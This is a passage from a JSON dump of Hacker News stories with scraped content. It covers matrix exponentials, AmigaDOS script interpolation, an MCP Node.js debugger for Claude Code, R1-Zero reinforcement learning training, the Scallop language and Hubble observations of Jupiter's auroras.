definition, wehave\nddteAt=0+A+A2t+12A3t2+...\\dfrac{d}{dt}e^{A t} = 0 + A + A^2 t + \\frac{1}{2} A^3 t^2 +...\nPull out A, and then wehave\nddteAt=A∗(I+At+12(At)2+...)=AeAt\\dfrac{d}{dt}e^{A t} = A*(I + A t + \\frac{1}{2} (A t)^2 + ...) = A e^{A t}.\nIt’s worth noting that the matrix AA can go on the left or right, and it always holds truethat\nAeAt=eAtAAe^{A t} = e^{At}A\nfor any square matrix, as stated in equation (3.44) in ModernRobotics.\nComments\nLeave comments on this post with Github Issues here.\nif (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {\n    var align = \"center\",\n        indent = \"0em\",\n        linebreak = \"false\";\n\n    if (false) {\n        align = (screen.width < 768) ? \"left\" : align;\n        indent = (screen.width < 768) ? \"0em\" : indent;\n        linebreak = (screen.width < 768) ? 'true' : linebreak;\n    }\n\n    var mathjaxscript = document.createElement('script');\n    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';\n    mathjaxscript.type = 'text/javascript';\n    mathjaxscript.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.3/latest.js?config=TeX-AMS-MML_HTMLorMML';\n\n    var configscript = document.createElement('script');\n    configscript.type = 'text/x-mathjax-config';\n    configscript[(window.opera ? \"innerHTML\" : \"text\")] =\n        \"MathJax.Hub.Config({\" +\n        \"    config: ['MMLorHTML.js'],\" +\n        \"    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'none' } },\" +\n        \"    jax: ['input/TeX','input/MathML','output/HTML-CSS'],\" +\n        \"    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js'],\" +\n        \"    displayAlign: '\"+ align +\"',\" +\n        \"    displayIndent: '\"+ indent +\"',\" +\n        \"    showMathMenu: true,\" +\n        \"    messageStyle: 'normal',\" +\n        \"    tex2jax: { \" +\n        \"        inlineMath: [ ['\\\\\\\\(','\\\\\\\\)'] ], \" +\n        \"        displayMath: [ ['$$','$$'] ],\" +\n        \"        processEscapes: true,\" +\n        \"        preview: 'TeX',\" +\n        \"    }, \" +\n        \"    'HTML-CSS': { \" +\n        \"        availableFonts: ['STIX', 'TeX'],\" +\n        \"        preferredFont: 'STIX',\" +\n        \"        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} },\" +\n        \"        linebreaks: { automatic: \"+ linebreak +\", width: '90% container' },\" +\n        \"    }, \" +\n        \"}); \" +\n        \"if ('default' !== 'default') {\" +\n            \"MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {\" +\n                \"var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;\" +\n                \"VARIANT['normal'].fonts.unshift('MathJax_default');\" +\n                \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" +\n                \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" +\n                \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" +\n            \"});\" +\n            \"MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {\" +\n                \"var VARIANT = MathJax.OutputJax.SVG.FONTDATA.VARIANT;\" +\n                \"VARIANT['normal'].fonts.unshift('MathJax_default');\" +\n                \"VARIANT['bold'].fonts.unshift('MathJax_default-bold');\" +\n                \"VARIANT['italic'].fonts.unshift('MathJax_default-italic');\" +\n                \"VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');\" +\n            \"});\" +\n        \"}\";\n\n    (document.body || document.getElementsByTagName('head')[0]).appendChild(configscript);\n    (document.body || document.getElementsByTagName('head')[0]).appendChild(mathjaxscript);\n}",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "3b71d292b6cc3d6b",
    "title": {
      "en": "California Attorney General issues consumer alert for 23andMe customers",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://oag.ca.gov/news/press-releases/attorney-general-bonta-urgently-issues-consumer-alert-23andme-customers",
    "score": 290,
    "by": "thoughtpeddler",
    "time": 1742666138,
    "content": "Subscribe to Our Newsletter\n\n          Subscribe\n\n            Subscribe",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2a9c1e6024029864",
    "title": {
      "en": "Bra and KET: String Interpolation in AmigaDOS",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.datagubbe.se/braket/",
    "score": 48,
    "by": "ingve",
    "time": 1742663122,
    "content": "BRA and KET: String Interpolation in AmigaDOS\n\nExploring the unnecessary, part 3735928559\nSpring 2025\n\nA Short Word on AmigaDOS Scripts\n\nWithout getting caught up in semantics, AmigaDOS in this text refers to the command line portion of the Amiga computers' operating system. AmigaDOS is based on TRIPOS, but was expanded and added to by both the original Amiga team and then Commodore. One thing that remains basically the same is the parser for shell scripts, or sequence files as they're called in TRIPOS. The script parser is reasonably competent for a 1980:s home computer OS and can be used for solving real world made up programming problems.\n\nThe parser accepts a few special directives, such as .KEY, which is used to describe the template for arguments passed to the script file. For example, .KEY FILENAME/A tells the parser that the script accepts a string argument called FILENAME. These directives are placed at the start of the script file.\n\nBy default, the parser does string interpolation using the characters < (less than) and > (greater than). The cleverness of this is debatable: these characters are also used for I/O redirection, which can quickly make things confusing. Luckily, the parser also accepts the directives .BRA and .KET, each followed by a single character, which lets the programmer override the default interpolation characters. The terms BRA and KET are most likely borrowed from Dirac notation.\n\nA Simple Example\n\nUsually, AmigaDOS scripts using interpolation replace the default characters with curly braces, { and }, respectively. This trend may have originated at Commodore. Consider the following script:\n\n.BRA {\n.KET }\n.KEY var\nEcho Hello {var}!\n\nHere, < and > have been substituted with { and }. The script takes a single argument, var, and the string interpolation then replaces {var} with the supplied argument. If saved as the file myscript and executed, the following AmigaShell session can be achieved:\n\nAmigaShell> myscript datagubbe\nHello datagubbe!\nAmigaShell> _\n\nInterpolate This!\n\nThis of course begs the question: What characters can be used for string interpolation in shell scripts? Thanks to the tireless efforts of talented researchers at Datagubbe Labs, an answer can be presented - and programmers worldwide can finally get a good night's sleep. Without further ado, let's get down to brass tacks!\n\nTest Tooling\n\nThere are text editors on the Amiga that'll happily insert any ASCII character into a text file, but why use an existing solution when you can build your own? An ARexx program - makescript - was quickly hacked together meticulously constructed for the purpose. This program generates an AmigaDOS script file with arbitrary characters for .BRA and .KET, supplied either as plain text or ASCII char codes. The source code for makescript is available here.\n\nBread and Butter\n\nThe defaults and the standard curly substitutes both work very well, as expected. Datagubbe Labs has taken the liberty of preparing screenshots, to further emphasize the validity and rigor of this important research. The scripts can also be downloaded, for transparency and reproducibility. Witness:\n\n  Default (no .BRA/.KET directives)\n  Standard (curly braces)\n\nOdds and Alphas\n\nWhat about non-matching character pairs, such as [ and }? That works, too, which was expected. As does standard letters, such as A and B.\n\n  Odd pair ([ and })\n  Letters (A and B)\n\nBells and Whistles\n\nFinally, non-printable characters were introduced. First, shift out (SO, decimal char code 14) and shift in (SI, decimal char code 15) were tested. These worked, too. Then, upping the ante, our relentless researchers decided to try the ASCII BEL character (decimal char code 7). AmigaDOS handles the BEL character by flashing the screen when it's encountered in a text. How would this fare in script execution? For closing the interpolation, negative acknowledgement (NAK, decimal char code 21), was chosen. This too, proved to work flawlessly - and no screen flashing was encountered when executing the script.\n\n  Shift In and Shift Out\n  BEL and NAK\n\nAnother Job Well Done\n\nNaturally, when printing the script file contents to the shell window using the AmigaDOS command Type, these characters cause a bit of commotion. BEL, for example, results in a screen flash as expected. In order to verify that the characters are indeed present in the script files, feel free to download them above - or study this screenshot of MicroEMACS, displaying the non-printable characters as control sequences.\n\nIn conclusion, AmigaDOS string interpolation offers both resilience and a wide variety of choice - a cause for celebration as good as any. Thanks for your attention, and happy hacking!",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "869d40a09904001e",
    "title": {
      "en": "Crabtime: Zig’s Comptime in Rust",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://crates.io/crates/crabtime",
    "score": 393,
    "by": "klaussilveira",
    "time": 1742409851,
    "content": "Click here to read the docs!",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "bb7728a51670dda3",
    "title": {
      "en": "Show HN: We made an MCP server so Cursor can debug Node.js on its own",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.npmjs.com/package/@hyperdrive-eng/mcp-nodejs-debugger",
    "score": 61,
    "by": "arthurgousset",
    "time": 1742659046,
    "content": "MCP NodeJS Debugger\nAn MCP server that gives Claude Code access to NodeJS at runtime to help you debug: mcp-nodejs-debugger.\nGet started\n\nAdd to Claude Code:\nclaude mcp add nodejs-debugger npx @hyperdrive-eng/mcp-nodejs-debugger\n\nStart Claude Code\nclaude\n╭───────────────────────────────────────────────────────╮\n│ ✻ Welcome to Claude Code research preview!            │\n│                                                       │\n│   /help for help                                      │\n│                                                       │\n│   Found 1 MCP server (use /mcp for status)            │\n╰───────────────────────────────────────────────────────╯\n\nRun a NodeJS server in debug mode (i.e. with the --inspect flat)\n# In another terminal\nnode --inspect {your_file.js}\n\nAsk Claude Code to debug your NodeJS server at runtime\n> I'm getting a runtime error in NodeJS.\n\n  {YOUR_RUNTIME_ERROR}\n\n  Please help me debug this error at runtime using the nodejs-debugger mcp.\n\nUsage\n\nAdd to Claude Code:\nclaude mcp add nodejs-debugger npx mcp-nodejs-debugger\n\nVerify connection\n> /mcp\n  ⎿  MCP Server Status\n\n     • nodejs-debugger: connected\n\nRemove from Claude Code:\nclaude remove nodejs-debugger\n\nExample\n\nHere is a buggy NodeJS server:\nnode --inspect index.js\n\nDebugger listening on ws://127.0.0.1:9229/2862f5a2-8618-4516-8429-1248b397e9b4\n\n#######################\n## THE RUNTIME ERROR ##\n#######################\nMongooseServerSelectionError: Could not connect to any servers in your MongoDB Atlas cluster. One common reason is that you're trying to access the database from an IP that isn't whitelisted. Make sure your current IP address is on your Atlas cluster's IP whitelist: https://www.mongodb.com/docs/atlas/security-whitelist/\n    at _handleConnectionErrors (/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/node_modules/mongoose/lib/connection.js:1110:11)\n    at NativeConnection.openUri (/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/node_modules/mongoose/lib/connection.js:1041:11)\n    at async main (/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app.js:35:3) {\n  reason: TopologyDescription {\n    type: 'ReplicaSetNoPrimary',\n    servers: Map(3) {\n      'ac-8e6hgk7-shard-00-01.cojoign.mongodb.net:27017' => [ServerDescription],\n      'ac-8e6hgk7-shard-00-02.cojoign.mongodb.net:27017' => [ServerDescription],\n      'ac-8e6hgk7-shard-00-00.cojoign.mongodb.net:27017' => [ServerDescription]\n    },\n    stale: false,\n    compatible: true,\n    heartbeatFrequencyMS: 10000,\n    localThresholdMS: 15,\n    setName: 'atlas-5syy8t-shard-0',\n    maxElectionId: null,\n    maxSetVersion: null,\n    commonWireVersion: 0,\n    logicalSessionTimeoutMinutes: null\n  },\n  code: undefined\n}\n\nClaude Code debugs the NodeJS server at runtime:\n> I'm getting a runtime error connecting to mongoose. Please help me debug by checking the value of\n  the mongodb configs at runtime using the nodejs-debugger mcp.\n\n  ⏺ I'll help you debug the mongoose connection issue using the Node.js debugger. Let's first understand where the\n  MongoDB connection is configured.\n\n  ⏺ Search(pattern: \"**/*.js\")…\n    ⎿ Found 100 files\n\n  ⏺ Let's set a breakpoint at the mongoose connection point and continue:\n\n  ⏺ nodejs-debugger:set_breakpoint (MCP)(file:                                                                         …\n        \"/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app.js\",\n         line: 35)\n  ⎿ Breakpoint set successfully. ID:\n       2:34:0:file:///Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app\\.js\n\n  ⏺ Let's list all our breakpoints:\n\n  ⏺ nodejs-debugger:list_breakpoints (MCP)\n  ⎿ [\n         {\n           \"file\": \"/Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app.js\",\n           \"line\": 35,\n           \"id\": \"2:34:0:file:///Users/arthur/Documents/thirdparties/mdn/express-locallibrary-tutorial/app\\\\.js\"\n         }\n       ]\n\n  ⏺ Let's try to execute a specific piece of code to check the connection variables:\n\n  ⏺ nodejs-debugger:nodejs_inspect (MCP)(js_code: \"// Get the mongoose module and inspect connection\\nconst mongoose = …\n                                        require('mongoose');\\nconsole.log('Current mongoose version:',\n                                        mongoose.version);\\nconsole.log('Current mongoose connection state:',\n                                        mongoose.connection.readyState);\\n// Log connection string safely (without\n                                        password)\\nconst connectionString = process.env.MONGODB_URI || \\n\n                                        \\\"mongodb+srv://cooluser:coolpassword@cluster0.cojoign.mongodb.net/local_library?retryWr\n                                        ites=true&w=majority&appName=Cluster0\\\";\\nconsole.log('Connection string\n                                        (masked):', connectionString.replace(/(?<=mongodb\\\\+srv:\\\\/\\\\/\\\\w+:)(.+?)(?=@)/,\n                                         '*****'));\")\n\n  ⎿ Console output:\n       [log] Current mongoose version: 8.9.5\n       [log] Current mongoose connection state: 0\n       [log] Connection string (masked): mongodb+srv://cooluser:coolpassword@cluster0.cojoign.mongodb.net/local_library?retryWri\n       tes=true&w=majority&appName=Cluster0\n\n  ⏺ The runtime error you're seeing in your application is related to MongoDB\n    Atlas connection issues. Based on your error message, the problem is:\n\n    1. You're using placeholder credentials (\"cooluser:coolpassword\")\n\n    To fix this, you have two options:\n\n    1. Use a local MongoDB instance by changing line 29-30 in app.js to:\n    const dev_db_url = \"mongodb://127.0.0.1:27017/local_library\";\n    2. Or correctly set up MongoDB Atlas:\n      - Log into Atlas at https://cloud.mongodb.com\n      - Go to Network Access and add your current IP to whitelist\n      - Create proper database credentials\n      - Update the connection string with real credentials\n\n    Which option would you like to proceed with?",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2faa9e49893d33b8",
    "title": {
      "en": "Understanding R1-Zero-Like Training: A Critical Perspective",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/sail-sg/understand-r1-zero",
    "score": 99,
    "by": "pama",
    "time": 1742654112,
    "content": "Understanding R1-Zero-Like Training: A Critical Perspective\n\n    🎉 Updates •\n    🔗 Links •\n    📖 TL;DR\n\n    💻 Usage  •\n    🍊 Citation •\n    🌻 Acknowledgement\n\nUpdates\n\n21/03/2025: 🎉 We release our paper, models and codebase. Our R1-Zero training is implemented with 🌾 Oat, a highly modular, research-friendly and efficient LLM RL framework.\n\nLinks\n\nUnderstanding R1-Zero-Like Training\n\n📄 Paper\n🤗 Models\n\nThere May Not Be Aha Moment in R1-Zero-like Training — A Pilot Study\n\n📄 Blog\n💻 Code\n\nOAT: A research-friendly framework for LLM online alignment\n\n💻 Codebase\n\nTL;DR\nTo understand R1-Zero-like training, we critically examine two core components: base models\nand reinforcement learning. We highlight our findings below.\nOn base models:\n\nDeepSeek-V3-Base already exhibit \"Aha moment\".\n\nAs the popular choice for R1-Zero-like training, Qwen2.5 base models demonstrate strong reasoning capabilities\neven without prompt templates: the average benchmark scores improve by ~60% (compared to the traditional 4-shot prompting)!\n\nOn reinforcement learning:\n\nGRPO leads to biased optimization! We propose a simple fix that improves token efficiency\nwhile maintaining reasoning performance, termed as Dr. GRPO (GRPO Done Right).\n\nIn R1-Zero-like training, the template and the question set perform a duet to affect the RL dynamics\n\n(Left Plot) For Qwen2.5-Math-1.5B, a mismatched template (e.g., R1 template) in fact destructs the reasoning capabilities before RL reconstructing it. This makes the improvement impressive on the surface.\n(Middle Plot) However, if a template does not deviate from the pretraining distribution too far, even a small and completely o.o.d. question set (e.g., GSM8K) could induce the reasoning ability equally well, by reinforcing correct reasoning behaviors instead of infusing new knowledge.\n\nBeyond Qwen, Llama can also be RL-tuned from base models. In this case, domain-specific pretraining will improves RL ceiling.\n\n(Right Plot) GRPO can even make Llama with math knowledge \"Aha\" by increasing the output length; however, it is likely due to its length bias, which can be removed by Dr. GRPO.\n\nOur minimalist R1-Zero recipe:\nOur analysis suggests a minimalist recipe for R1-Zero-like training:\nWe RL-tune Qwen2.5-\nMath-7B using the (unbiased) Dr. GRPO algorithm on MATH level 3-5 questions with the Qwen-Math template, and achieve state-of-the-art performance with only 27 hours compute on 8× A100 GPUs.\n\nIf you are interested in more details, please check out our paper!\nUsage\nInstall\nWe recommend a clean python==3.10 environment for development.\n# Install vllm & oat, the LLM RL framework we developed r1-zero training on.\npip install vllm==0.7.2 && pip install oat-llm==0.0.9\n\n# Install this package locally to use the math grader.\ngit clone git@github.com:sail-sg/understand-r1-zero.git && cd understand-r1-zero\npip install -e .\n\nTraining\nWe implement R1-Zero training by extending Oat's Learner and Actor components. Please see train_zero_math.py for a step-by-step guide.\n# Patch LD_LIBRARY_PATH to avoid dependency errors:\nexport LD_LIBRARY_PATH=$(python -c \"import sysconfig; print(sysconfig.get_config_var('LIBDIR'))\"):$LD_LIBRARY_PATH\n\n# Run the experiment (tested on 8 x A100-40G) with Dr. GRPO:\n# (change to `--critic_type grpo` for running GRPO)\npython train_zero_math.py \\\n    --critic_type drgrpo \\\n    --gpus 8 \\\n    --enable_prefix_caching \\\n    --collocate \\\n    --vllm_sleep \\\n    --vllm_gpu_ratio 0.35 \\\n    --gradient-checkpointing \\\n    --flash-attn \\\n    --bf16 \\\n    --rnd-seed \\\n    --learning_rate 0.000001 \\\n    --lr_scheduler constant \\\n    --num_ppo_epochs 1 \\\n    --beta 0 \\\n    --oracle_type reward \\\n    --oracle math \\\n    --pretrain Qwen/Qwen2.5-Math-1.5B \\\n    --prompt_template r1 \\\n    --zero-stage 2 \\\n    --ref_offload \\\n    --prompt_data ./datasets/train/math_12k \\\n    --train_split train \\\n    --input_key problem \\\n    --output_key answer \\\n    --max-train 9999999 \\\n    --num_prompt_epoch 20 \\\n    --prompt_max_length 1024 \\\n    --num_samples 8 \\\n    --temperature 1 \\\n    --top_p 1 \\\n    --generate_max_length 3000 \\\n    --save_steps -1 \\\n    --train_batch_size 128 \\\n    --rollout_batch_size 128 \\\n    --rollout_batch_size_per_device 16 \\\n    --pi_buffer_maxlen_per_device 128 \\\n    --eval_batch_size 200 \\\n    --eval_steps 16 \\\n    --eval_temperature 0 \\\n    --eval_generate_max_length 3000 \\\n    --eval_data ./datasets/evaluation_suite \\\n    --eval_input_key input \\\n    --use-wb \\\n    --wb-run-name qwen2.5-Math-1.5b-r1-zero \\\n    --wb_project oat-zero\n\nPlease see here for more example scripts.\nEvaluation\n# Evaluate our models:\npython evaluate_model.py --model_name sail/Qwen2.5-Math-7B-Oat-Zero\npython evaluate_model.py --model_name sail/Qwen2.5-Math-1.5B-Oat-Zero\npython evaluate_model.py --model_name sail/Llama-3.2-3B-Oat-Zero --template r1\n\n# Evaluate baseline models:\npython evaluate_model.py --model_name Qwen/Qwen2.5-Math-1.5B\npython evaluate_model.py --model_name Qwen/Qwen2.5-Math-7B\npython evaluate_model.py --model_name hkust-nlp/Qwen-2.5-Math-7B-SimpleRL-Zero\npython evaluate_model.py --model_name PRIME-RL/Eurus-2-7B-PRIME-Zero\npython evaluate_model.py --model_name Open-Reasoner-Zero/Open-Reasoner-Zero-7B\n\nCitation\nIf you find our work useful for your research, please consider citing:\n@misc{liu2025understanding,\n  title={Understanding R1-Zero-Like Training: A Critical Perspective},\n  author={Zichen Liu and Changyu Chen and Wenjun Li and Penghui Qi and Tianyu Pang and Chao Du and Wee Sun Lee and Min Lin},\n  year={2025},\n  howpublished={\\url{https://github.com/sail-sg/understand-r1-zero}},\n}\n\nAcknowledgement\n\nThis work is supported by Sea AI Lab for computing resources.\nThe training codes are built on Oat, which employs vLLM, DeepSpeed and launchpad.\nThe base models are from Qwen2.5-Math, Llama, and DeepSeek.\nWe thank Qingfeng Lan for his time in thoroughly reviewing our code.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "34680cd787affb42",
    "title": {
      "en": "Scallop – A Language for Neurosymbolic Programming",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.scallop-lang.org/",
    "score": 190,
    "by": "andsoitis",
    "time": 1742618708,
    "content": "Neurosymbolic Programming with Scallop\n\n            Install\n            Tutorial\n\nLanguage\n\n                  Scallop is a declarative language designed to support rich symbolic reasoning in AI applications.\n\t\t  It is based on Datalog, a logic rule-based query language for relational databases.\n\n                Solver\n\n                  Scallop is a scalable Datalog solver equipped with support for discrete, probabilistic, and\n                  differentiable modes of reasoning.\n                  These modes are configurable to suit the needs of different AI applications.\n\n                Framework\n\n                  Scallop provides bindings to support logic reasoning modules within Python programs.\n                  As a result, Scallop can be deeply integrated with existing PyTorch machine\n                  learning pipelines.\n\nWide Range of Applications\n\n              Scallop can be used to develop a wide variety of applications in vision and NLP that involve symbolic reasoning.\n              The reasoning component is specified via logic rules which can then be deeply\n              integrated with machine learning models, such as convolutional neural networks and transformers.\n\nCLEVR, Compositional Language and Elementary Visual Reasoning\nThis task concerns reasoning about simple 3D objects in a given image in order to\nanswer questions such as \"how many objects are colored blue?\".\nTo express this task in Scallop, we use neural components to generate a symbolic\nrepresentation of the image, in the form of a scene graph, as well as a\nprogrammatic query to represent the question.  On the other hand, the reasoning\ncomponent specifies various operations such as selecting, comparing, and counting\nobjects with the specified attributes.\nScallop enables to integrate all of these components in a common framework\nand perform training in an end-to-end fashion.\ntype Color = RED | GREEN | BLUE\ntype Size = LARGE | SMALL\ntype Expr = Scene() | Color(Color, Expr) | Size(Size, Expr) | Count(Expr)\n\n// Programmatic query evaluator\nrel eval(e, output_obj) = case e is Scene(), input_obj_ids(output_obj)\nrel eval(e, output_obj) = case e is Color(c, e1), eval(e1, output_obj), input_obj_color(output_obj, c)\nrel eval(e, output_obj) = case e is Size(s, e1), eval(e1, output_obj), input_obj_size(output_obj, s)\nrel eval_num(e, n) = n := count(o: eval(e1, o) where e1: case e is Count(e1))\nrel result(n) = root(e) and eval_num(e, n)\n\n// Scene Graph\nrel input_obj_ids = {0, 1}\nrel input_obj_color = {(0, RED), (1, GREEN)}\nrel input_obj_size = {(0, LARGE), (1, SMALL)}\n\n// Count how many large red objects\nconst MY_QUERY = Count(Color(RED, Size(LARGE, Scene())))\nrel root(MY_QUERY)\n\nPathfinder, Long Range Connectivity Reasoning\nIn this task, we are provided with black-and-white images containing two dots\nand dashed lines.\nThe goal is to determine whether the two dots are connected by a dashed line.\nThis task can be programmed in just a few lines in Scallop using a\nvery simple neural architecture for detecting dots and dashes, together with\nthe logic rules below, and outperforms state-of-the-art transformers.\nrel path(x, y) = dash(x, y)\nrel path(x, y) = path(x, z), dash(z, y)\nrel is_connected() = dot(x), dot(y), path(x, y), x != y\n\nEvaluating Hand-Written Formulae\nIn this task, we are given a sequence of hand-written symbols, including 0 to 9\nand simple arithmetic operations.\nThe goal is to recognize the formula and evaluate the expression.\nIn the adjoining example, the input represents the formula 1 + 3 / 5, which\nevaluates to 1.6.\nOne can craft a full context-free grammar parser in Scallop that can parse\nprobabilistic inputs.\nA parser and evaluator for the above formulae can be written in just 5 lines\nof Scallop code shown below.\nThis program can be trained in an end-to-end fashion with the neural model\nfor recognizing individual symbols.\nOnce trained, the resulting program will automatically find the most likely\nformula and return the evaluated result.\ntype symbol(index: usize, symbol: String)\ntype length(n: usize)\n\nrel digit = {\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"}\n\nrel factor(x as f32, b, b + 1) = symbol(b, x) and digit(x)\nrel mult_div(x, b, r) = factor(x, b, r)\nrel mult_div(x * y, b, e) = mult_div(x, b, m) and symbol(m, \"*\") and factor(y, m + 1, e)\nrel mult_div(x / y, b, e) = mult_div(x, b, m) and symbol(m, \"/\") and factor(y, m + 1, e)\nrel add_minus(x, b, r) = mult_div(x, b, r)\nrel add_minus(x + y, b, e) = add_minus(x, b, m) and symbol(m, \"+\") and mult_div(y, m + 1, e)\nrel add_minus(x - y, b, e) = add_minus(x, b, m) and symbol(m, \"-\") and mult_div(y, m + 1, e)\n\nrel result(y) = add_minus(y, 0, l) and length(l)",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "877cfaddbe3399f5",
    "title": {
      "en": "Hubble Captures Vivid Auroras in Jupiter's Atmosphere (2016)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://science.nasa.gov/missions/hubble/hubble-captures-vivid-auroras-in-jupiters-atmosphere/",
    "score": 45,
    "by": "mooreds",
    "time": 1742426968,
    "content": "Explore HubbleScienceHubble Space TelescopeHubble Captures Vivid Auroras...Hubble HomeOverviewAbout HubbleThe History of HubbleHubble TimelineWhy Have a Telescope in Space?Hubble by the NumbersAt the MuseumFAQsImpact & BenefitsHubble's Impact & BenefitsScience ImpactsCultural ImpactTechnology BenefitsImpact on Human SpaceflightAstro Community ImpactsScienceHubble ScienceScience ThemesScience HighlightsScience Behind DiscoveriesHubble's Partners in ScienceUniverse UncoveredExplore the Night SkyObservatoryHubble ObservatoryHubble DesignMission OperationsMissions to HubbleHubble vs WebbTeamHubble TeamCareer AspirationsHubble AstronautsNewsHubble NewsHubble News ArchiveSocial MediaMedia ResourcesMultimediaMultimediaImagesVideosSonificationsPodcastse-BooksOnline ActivitiesLithographsFact SheetsPosters Hubble on the NASA AppGlossary More35th AnniversaryOnline Activities4 min readHubble Captures Vivid Auroras in Jupiter’s AtmosphereNASA Hubble Mission TeamGoddard Space Flight CenterJun 30, 2016   Article\n\nAstronomers are using NASA's Hubble Space Telescope to study auroras – stunning light shows in a planet's atmosphere – on the poles of the largest planet in the solar system, Jupiter. The auroras were photographed during a series of Hubble Space Telescope Imaging Spectrograph...\n\nAstronomers are using the NASA/ESA Hubble Space Telescope to study auroras — stunning light shows in a planet’s atmosphere — on the poles of the largest planet in the solar system, Jupiter. This observation program is supported by measurements made by NASA’s Juno spacecraft, currently on its way to Jupiter.\n\nJupiter, the largest planet in the solar system, is best known for its colorful storms, the most famous being the Great Red Spot. Now astronomers have focused on another beautiful feature of the planet, using Hubble's ultraviolet capabilities.\n\nThe extraordinary vivid glows shown in the new observations are known as auroras. They are created when high-energy particles enter a planet’s atmosphere near its magnetic poles and collide with atoms of gas. As well as producing beautiful images, this program aims to determine how various components of Jupiter’s auroras respond to different conditions in the solar wind, a stream of charged particles ejected from the sun.\n\nThis observation program is perfectly timed as NASA’s Juno spacecraft is currently in the solar wind near Jupiter and will enter the orbit of the planet in early July 2016. While Hubble is observing and measuring the auroras on Jupiter, Juno is measuring the properties of the solar wind itself; a perfect collaboration between a telescope and a space probe.\n\n“These auroras are very dramatic and among the most active I have ever seen”, said Jonathan Nichols from the University of Leicester, U.K., and principal investigator of the study. “It almost seems as if Jupiter is throwing a firework party for the imminent arrival of Juno.”\n\nTo highlight changes in the auroras Hubble is observing Jupiter almost daily for several months. Using this series of far-ultraviolet images from Hubble's Space Telescope Imaging Spectrograph, it is possible for scientists to create videos that demonstrate the movement of the vivid auroras, which cover areas bigger than Earth.\n\nNot only are the auroras huge in size, they are also hundreds of times more energetic than auroras on Earth. And, unlike those on Earth, they never cease. While on Earth the most intense auroras are caused by solar storms — when charged particles rain down on the upper atmosphere, excite gases and cause them to glow red, green and purple — Jupiter has an additional source for its auroras.\n\nThe strong magnetic field of the gas giant grabs charged particles from its surroundings. This includes not only the charged particles within the solar wind but also the particles thrown into space by its orbiting moon Io, known for its numerous and large volcanoes.\n\nThe new observations and measurements made with Hubble and Juno will help to better understand how the sun and other sources influence auroras. While the observations with Hubble are still ongoing and the analysis of the data will take several more months, the first images and videos are already available and show the auroras on Jupiter’s north pole in their full beauty.\n\nThe Jet Propulsion Laboratory (JPL) in Pasadena, California, manages the Juno mission for Southwest Research Institute in San Antonio, Texas. Juno is part of NASA's New Frontiers Program, which is managed at NASA's Marshall Space Flight Center in Huntsville, Alabama, for NASA's Science Mission Directorate in Washington, D.C. Lockheed Martin Space Systems, Denver, built the spacecraft. The California Institute of Technology in Pasadena manages JPL for NASA.\n\nThe Hubble Space Telescope is a project of international cooperation between NASA and the European Space Agency. NASA's Goddard Space Flight Center in Greenbelt, Maryland, manages the telescope. The Space Telescope Science Institute (STScI) in Baltimore, Maryland, conducts Hubble science operations. STScI is operated for NASA by the Association of Universities for Research in Astronomy (AURA) in Washington, D.C.\n\n\t\t\t\tRelated Images & Videos\n\n\t\t\t\t\t\t\t\tAuroras on Jupiter\n\n\t\t\t\t\t\t\t\tAstronomers are using NASA's Hubble Space Telescope to study auroras – stunning light shows in a planet's atmosphere – on the poles of the largest planet in the solar system, Jupiter. The auroras were photographed during a series of Hubble Space Telescope Imaging Spectrograph...\n\n\t\t\t\t\t\t\t\tJupiter WFC3/UVIS\n\n\t\t\t\t\t\t\t\tThis visible-light image of Jupiter was taken with the Wide Field Camera 3 aboard NASA's Hubble Space Telescope on April 21, 2014.\n\n\t\t\t\t\t\t\t\tScale and Compass Image for Jupiter Aurora\n\n\t\t\t\t\t\t\t\tHubble Time-Lapse of Aurora on Jupiter (May 19, 2016)\n\n\t\t\t\t\t\t\t\tThis time-lapse video of the vivid auroras in Jupiter's atmosphere was created using far-ultraviolet-light observations made on May 19, 2016, with the Space Telescope Imaging Spectrograph aboard NASA's Hubble Space Telescope. Hubble is particularly suited to observing and...\n\n\t\t\t\t\t\t\t\tHubble Time-Lapse of Aurora on Jupiter (June 2, 2016)\n\n\t\t\t\t\t\t\t\tThis time-lapse video of the vivid auroras in Jupiter's atmosphere was created using far-ultraviolet-light observations made on June 2, 2016, with the Space Telescope Imaging Spectrograph aboard NASA's Hubble Space Telescope. Hubble is particularly suited to observing 